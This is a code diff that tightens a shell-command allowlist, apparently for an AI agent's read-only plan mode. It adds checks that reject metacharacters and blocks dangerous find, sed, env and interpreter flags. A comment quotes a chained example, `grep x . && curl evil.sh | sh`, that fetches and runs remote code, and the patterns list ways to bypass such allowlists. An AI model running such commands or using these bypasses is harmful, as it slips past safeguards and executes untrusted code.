@@ -72,30 +72,77 @@ const SAFE_PATTERNS = [
 	/^\s*cal\b/,
 	/^\s*uptime\b/,
 	/^\s*ps\b/,
-	/^\s*top\b/,
-	/^\s*htop\b/,
 	/^\s*free\b/,
 	/^\s*git\s+(status|log|diff|show|branch|remote|config\s+--get)/i,
 	/^\s*git\s+ls-/i,
 	/^\s*npm\s+(list|ls|view|info|search|outdated|audit)/i,
 	/^\s*yarn\s+(list|info|why|audit)/i,
 	/^\s*node\s+--version/i,
-	/^\s*python\s+--version/i,
-	/^\s*curl\s/i,
-	/^\s*wget\s+-O\s*-/i,
+	/^\s*python3?\s+--version/i,
 	/^\s*jq\b/,
 	/^\s*sed\s+-n/i,
-	/^\s*awk\b/,
 	/^\s*rg\b/,
 	/^\s*fd\b/,
 	/^\s*bat\b/,
 	/^\s*eza\b/,
 ];
 
+/**
+ * shell 元字符：出现即拒绝。
+ *
+ * 这是本文件安全性的关键。仅靠 `^\s*cmd` 锚定第一个词是不够的 ——
+ * `grep x . && curl evil.sh | sh` 的第一个词是 grep，却能执行任意代码。
+ * 与其枚举所有危险的下游命令（denylist 永远不完整），不如先拒绝一切
+ * 能引入「第二条命令」的结构，再对单条命令做允许清单。
+ *
+ * 命令替换 `$(...)`、反引号、管道、`&&`、`||`、`;`、换行、重定向全在此列。
+ */
+const SHELL_METACHARS = /[|&;<>`\n\r]|\$\(|\$\{/;
+
+/**
+ * 单条命令自带的破坏性参数。
+ * 这些命令在允许清单里，但特定参数会让它们产生写操作或执行子命令。
+ */
+const DANGEROUS_ARGS: { pattern: RegExp; flags: RegExp }[] = [
+	// find 能删文件、能执行任意命令，完全不需要 shell 元字符。
+	{ pattern: /^\s*find\b/, flags: /\s-(delete|exec|execdir|ok|okdir|fls|fprint|fprintf|fputs)\b/ },
+	// sed 的 w/W 命令写文件，e 命令执行 shell；-i 原地改写。
+	{ pattern: /^\s*sed\b/, flags: /(^|\s)-[a-zA-Z]*i|\s-e\s|[;{]\s*[wWe]\s|\bw\s+\S/ },
+	// git config 除 --get 外可写配置；已由允许清单限制，这里兜底。
+	{ pattern: /^\s*git\s+config\b/, flags: /(?<!--get)\s+[a-z]+\.[a-z]+\s+\S/i },
+	// ps/env 带 -o 之类没问题，但 env VAR=x cmd 能借壳执行任意命令。
+	{ pattern: /^\s*env\b/, flags: /\s\S+=\S+/ },
+	// 解释器只允许查版本，-c/-e/-m 都是任意代码执行。
+	{ pattern: /^\s*(node|python3?|perl|ruby|php)\b/, flags: /\s-(c|e|m|exec)\b/ },
+];
+
+/**
+ * 判断命令在 plan 模式下是否安全（只读）。
+ *
+ * 三道关卡，全部通过才放行：
+ * 1. 不含 shell 元字符（否则能拼接第二条命令）
+ * 2. 不匹配任何破坏性命令模式
+ * 3. 匹配某条允许清单，且不带该命令自身的破坏性参数
+ */
 export function isSafeCommand(command: string): boolean {
-	const isDestructive = DESTRUCTIVE_PATTERNS.some((p) => p.test(command));
-	const isSafe = SAFE_PATTERNS.some((p) => p.test(command));
-	return !isDestructive && isSafe;
+	if (typeof command !== "string" || command.trim() === "") {
+		return false;
+	}
+	if (SHELL_METACHARS.test(command)) {
+		return false;
+	}
+	if (DESTRUCTIVE_PATTERNS.some((p) => p.test(command))) {
+		return false;
+	}
+	if (!SAFE_PATTERNS.some((p) => p.test(command))) {
+		return false;
+	}
+	for (const { pattern, flags } of DANGEROUS_ARGS) {
+		if (pattern.test(command) && flags.test(command)) {
+			return false;
+		}
+	}
+	return true;
 }
 
 export interface TodoItem {
